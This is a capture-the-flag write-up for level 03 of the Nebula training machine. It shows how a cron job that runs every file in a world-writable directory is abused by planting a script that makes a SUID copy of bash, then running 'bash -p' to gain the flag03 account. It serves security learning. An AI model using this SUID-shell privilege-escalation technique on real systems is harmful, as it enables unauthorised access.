# Level 03
Check the home directory of **flag03** and take note of the files there.

There is a crontab that is called every couple of minutes.

To do this level, log in as the **level03** account with the password level03. Files for this level can be found in **/home/flag03**.

## Source Code
There is no source code available for this level.

## Writeup
In /home/flag03 there is a bash script and a directory:

```bash
level03@nebula:/home/flag03$ ll
total 6
drwxr-x--- 3 flag03 level03  103 2011-11-20 20:39 ./
drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ../
-rw-r--r-- 1 flag03 flag03   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag03 flag03  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag03 flag03   675 2011-05-18 02:54 .profile
drwxrwxrwx 2 flag03 flag03     3 2012-08-18 05:24 writable.d/
-rwxr-xr-x 1 flag03 flag03    98 2011-11-20 21:22 writable.sh*
```

We can read the script:

```bash
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

This script for every file in the directory **/home/flag03/writable.d** execute the command:

```bash
ulimit -t 5; bash -x "$i"
```

The **ulimit** command is a built-in Linux shell command that allows viewing or limiting system resource amounts that individual users consume. Limiting resource usage is valuable in environments with multiple users and system performance issues.

With the **-t** arguments we can specifies a process' maximum running time, in seconds.

After this command that is to able the other player to play with the machine without interfere with earch others.

The next command is **bash -x "$i"** that execute every files in the directory.

Finally, the script clear the directory with:

```bash
rm -f "$i"
```

We know that there is a cron job that is called every couple of minutes that invoke that script.

So we can create a script that copy the **/bin/bash** binary in the **flag03** directory and add the **SUID** bit to it. The result is a bash binary with the permission of **flag03** account.

Write this script into a file **script.sh** in **/home/flag03/writable.d** directory:

```bash
#!/bin/bash

cp /bin/bash /home/flag03/bash
chmod u+s /home/flag03/bash
```

Now attend that the cron job execute the script.

We can examite that with **watch** command:

```bash
watch -n 1 ls -l /home/flag03/
```

Now we have a **bash** binary with **SUID**:

```bash
level03@nebula:/home/flag03$ ll
total 910
drwxr-x--- 1 flag03 level03     80 2023-03-14 04:45 ./
drwxr-xr-x 1 root   root        80 2012-08-27 07:18 ../
-rwsr-xr-x 1 flag03 flag03  916692 2023-03-14 04:45 bash*
-rw-r--r-- 1 flag03 flag03     220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag03 flag03    3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag03 flag03     675 2011-05-18 02:54 .profile
drwxrwxrwx 1 flag03 flag03      40 2023-03-14 04:45 writable.d/
-rwxr-xr-x 1 flag03 flag03      98 2011-11-20 21:22 writable.sh*
```

Just launch **/home/flag03/bash** with **-p** argument prevent bash to drop execute privileges:

```bash
/home/flag03/bash -p
```

We have now a bash with **flag03** account:

```bash
level03@nebula:/home/flag03$ /home/flag03/bash -p
bash-4.2$ id
uid=1004(level03) gid=1004(level03) euid=996(flag03) groups=996(flag03),1004(level03)
```

Finally, run **getflag** command:

```bash
bash-4.2$ getflag
You have successfully executed getflag on a target account
```